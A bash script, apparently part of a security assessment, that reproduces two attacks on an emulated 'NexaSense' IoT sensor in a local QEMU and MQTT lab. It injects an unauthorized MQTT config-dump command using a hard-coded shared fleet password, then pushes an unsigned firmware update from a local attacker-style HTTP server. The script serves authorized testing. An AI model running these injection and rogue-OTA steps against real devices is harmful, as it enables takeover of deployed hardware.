#!/bin/bash
# Reproducao da avaliacao NexaSense em ambiente autorizado (QEMU + mosquitto local).
# Executa: 3 capturas de trafego + Demo A (injecao MQTT) + Demo B (OTA sem assinatura).
# NAO acessa redes externas: todo o trafego fica no loopback/laboratorio.
set -e
R=$(cd "$(dirname "$0")/.." && pwd)
. "$R/lab/env.sh"
PASS='Nx-Shared-Fleet-Pass-2026'
wait_dev(){ for i in $(seq 1 40); do grep -q "as NXS-000000" /tmp/mosq.log && return; sleep 1; done; }

echo "[0] broker MQTT local"
pkill -f qemu-system-xtensa 2>/dev/null || true; pkill mosquitto 2>/dev/null || true; sleep 1
: > /tmp/mosq.log; ( cd "$R/lab/mosquitto" && mosquitto -c mosquitto.conf >/tmp/mosq.log 2>&1 & ); sleep 1

echo "[1] captura 01 - operacao normal (boot UART + MQTT + HTTP)"
cp "$R/firmware/original/nexasense-v1.0.0-proto_flash4MB.bin" "$R/firmware/work/device_flash.bin"; chmod 644 "$R/firmware/work/device_flash.bin"
( timeout 70 mosquitto_sub -h 127.0.0.1 -u nexasense -P "$PASS" -t 'nexahome/#' -v > "$R/network/evidence/mqtt_subscriber_backend.txt" 2>&1 & )
( "$R/lab/run_qemu.sh" "$R/firmware/work/device_flash.bin" capture-01-operacao-normal >/tmp/qemu.log 2>&1 & )
( sleep 15; curl -s -i localhost:8080/status > "$R/network/evidence/http_status.txt"; curl -s -i localhost:8080/config > "$R/network/evidence/http_config.txt" ) &
python3 "$R/lab/uart_client.py" "$R/hardware/evidence/uart-01-boot-e-console.log" 55 "20:help" "22:info" "24:config" "26:interval 5"
sleep 1; pkill -f qemu-system-xtensa 2>/dev/null || true; sleep 1

echo "[2] DEMO A - injecao de comando MQTT sem autorizacao (captura 02)"
cp "$R/firmware/original/nexasense-v1.0.0-proto_flash4MB.bin" "$R/firmware/work/device_flash.bin"; chmod 644 "$R/firmware/work/device_flash.bin"
: > /tmp/mosq.log; pkill mosquitto 2>/dev/null || true; sleep 1; ( cd "$R/lab/mosquitto" && mosquitto -c mosquitto.conf >/tmp/mosq.log 2>&1 & ); sleep 1
( "$R/lab/run_qemu.sh" "$R/firmware/work/device_flash.bin" capture-02-demo-mqtt >/tmp/qemu.log 2>&1 & )
( python3 "$R/lab/uart_client.py" "$R/demo/evidence/demoA-uart-drain.log" 45 >/dev/null 2>&1 & )
wait_dev
stdbuf -oL mosquitto_sub -h 127.0.0.1 -u nexasense -P "$PASS" -t 'nexahome/sense/+/resp' -v > "$R/demo/evidence/demoA-mqtt-cmd-injection.txt" 2>&1 & SUB=$!
sleep 2
mosquitto_pub -h 127.0.0.1 -u nexasense -P "$PASS" -t 'nexahome/sense/NXS-000000/cmd' -m '{"cmd":"get_config"}'
sleep 4; kill $SUB 2>/dev/null || true; pkill -f qemu-system-xtensa 2>/dev/null || true; sleep 1

echo "[3] DEMO B - OTA sem assinatura a partir de servidor do atacante (captura 03)"
cp "$R/firmware/original/nexasense-v1.0.0-proto_flash4MB.bin" "$R/firmware/work/device_flash.bin"; chmod 644 "$R/firmware/work/device_flash.bin"
: > /tmp/mosq.log; pkill mosquitto 2>/dev/null || true; pkill -f http.server 2>/dev/null || true; sleep 1
( cd "$R/lab/mosquitto" && mosquitto -c mosquitto.conf >/tmp/mosq.log 2>&1 & ); sleep 1
mkdir -p "$R/lab/ota_server"; cp "$R/firmware/original/nexasense-v1.0.0-proto_app.bin" "$R/lab/ota_server/nexasense.bin"
( cd "$R/lab/ota_server" && python3 -m http.server 8000 >/tmp/ota_server.log 2>&1 & ); sleep 1
( "$R/lab/run_qemu.sh" "$R/firmware/work/device_flash.bin" capture-03-demo-ota >/tmp/qemu.log 2>&1 & )
( python3 "$R/lab/uart_client.py" "$R/demo/evidence/demoB-ota-uart.log" 120 >/dev/null 2>&1 & )
wait_dev; sleep 2
mosquitto_pub -h 127.0.0.1 -u nexasense -P "$PASS" -t 'nexahome/sense/NXS-000000/cmd' -m '{"cmd":"ota","url":"http://10.0.2.2:8000/nexasense.bin"}'
for i in $(seq 1 90); do grep -q "imagem aceita\|imagem invalida" "$R/demo/evidence/demoB-ota-uart.log" && break; sleep 1; done
sleep 4; pkill -f qemu-system-xtensa 2>/dev/null || true; pkill -f http.server 2>/dev/null || true; pkill mosquitto 2>/dev/null || true

echo "OK - evidencias atualizadas em network/, hardware/, demo/"
